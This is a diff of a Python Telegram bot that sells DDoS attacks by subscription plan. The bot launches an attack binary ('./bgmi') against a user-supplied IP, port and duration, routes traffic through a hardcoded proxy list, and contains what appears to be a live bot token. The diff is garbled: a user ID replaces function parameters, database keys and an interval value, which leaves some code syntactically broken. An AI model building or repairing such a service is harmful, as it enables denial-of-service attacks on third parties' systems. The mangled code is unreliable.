@@ -19,13 +19,12 @@ loop = asyncio.get_event_loop()
 TOKEN = '6963762658:AAEg_OFDu9QzyM-SL4daqfROm7I4918PQ7c'
 
 
-MONGO_URI = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all''
+MONGO_URI = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
 
 
-
-FORWARD_CHANNEL_ID = -100
-CHANNEL_ID = -100
-error_channel_id = -100
+FORWARD_CHANNEL_ID = -1002122385534
+CHANNEL_ID = -1001681003432
+error_channel_id = -1002221237969
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -34,7 +33,7 @@ db = client['sid']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
+REQUEST_INTERVAL = 6129136659
 
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
 
@@ -44,7 +43,6 @@ async def start_asyncio_thread():
 
 def update_proxy():
     proxy_list = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all"
         "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
         "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
         "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
@@ -81,9 +79,9 @@ def update_proxy_command(message):
     chat_id = message.chat.id
     try:
         update_proxy()
-        bot.send_message(chat_id, "Proxy updated successfully.")
+        bot.send_message(6129136659, "Proxy updated successfully.")
     except Exception as e:
-        bot.send_message(chat_id, f"Failed to update proxy: {e}")
+        bot.send_message(6129136659, f"Failed to update proxy: {e}")
 
 async def start_asyncio_loop():
     while True:
@@ -93,9 +91,9 @@ async def run_attack_command_async(target_ip, target_port, duration):
     process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 200")
     await process.communicate()
 
-def is_user_admin(6129136659, 1002122385534):
+def is_user_admin(user_id, 6129136659):
     try:
-        return bot.get_chat_member(,1002122385534,6129136659).status in ['6129136659', '6129136659']
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
     except:
         return False
 
@@ -103,7 +101,7 @@ def is_user_admin(6129136659, 1002122385534):
 def approve_or_disapprove_user(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
-    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    is_admin = is_user_admin(6129136659, -1002122385534)
     cmd_parts = message.text.split()
 
     if not is_admin:
@@ -131,14 +129,14 @@ def approve_or_disapprove_user(message):
 
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
         users_collection.update_one(
-            {"user_id": target_user_id},
+            {"6129136659": 6129136659},
             {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
             upsert=True
         )
         msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
     else:  # disapprove
         users_collection.update_one(
-            {"user_id": target_user_id},
+            {"6129136659": 6129136659},
             {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
             upsert=True
         )
@@ -152,7 +150,7 @@ def attack_command(message):
     chat_id = message.chat.id
 
     try:
-        user_data = users_collection.find_one({"user_id": 6129136659})
+        user_data = users_collection.find_one({"6129136659": 6129136659})
         if not user_data or user_data['plan'] == 0:
             bot.send_message(chat_id, "You are not approved to use this bot. Please contact the @O_P_J_I_R_E_N.")
             return
@@ -176,7 +174,7 @@ def attack_command(message):
     chat_id = message.chat.id
 
     try:
-        user_data = users_collection.find_one({"user_id": 6129136659})
+        user_data = users_collection.find_one({"6129136659": 6129136659})
         if not user_data or user_data['plan'] == 0:
             bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the @O_P_J_I_R_E_N.*", parse_mode='Markdown')
             return
@@ -241,10 +239,10 @@ def handle_message(message):
         bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "Canary Download✔️":
-        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/OPJIREN/638*", parse_mode='Markdown')
-    elif message.text == "@O_P_J_I_R_E_N🏦":
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/+MH7khktbQMNhMTc1*", parse_mode='Markdown')
+    elif message.text == "My Account🏦":
         user_id = message.from_user.id
-        user_data = users_collection.find_one({"@O_P_J_I_R_E_N": 6129136659})
+        user_data = users_collection.find_one({"6129136659": 6129136659})
         if user_data:
             username = message.from_user.username
             plan = user_data.get('plan', 'N/A')
@@ -255,11 +253,11 @@ def handle_message(message):
                         f"Valid Until: {valid_until}\n"
                         f"Current Time: {current_time}*")
         else:
-            response = "*No account information found. Please contact the @O_P_J_I_R_E_N.*"
+            response = "*No account information found. Please contact the administrator.*"
         bot.reply_to(message, response, parse_mode='Markdown')
     elif message.text == "Help❓":
         bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
-    elif message.text == "@O_P_J_I_R_E_N✔️":
+    elif message.text == "Contact admin✔️":
         bot.reply_to(message, "*@O_P_J_I_R_E_N*", parse_mode='Markdown')
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
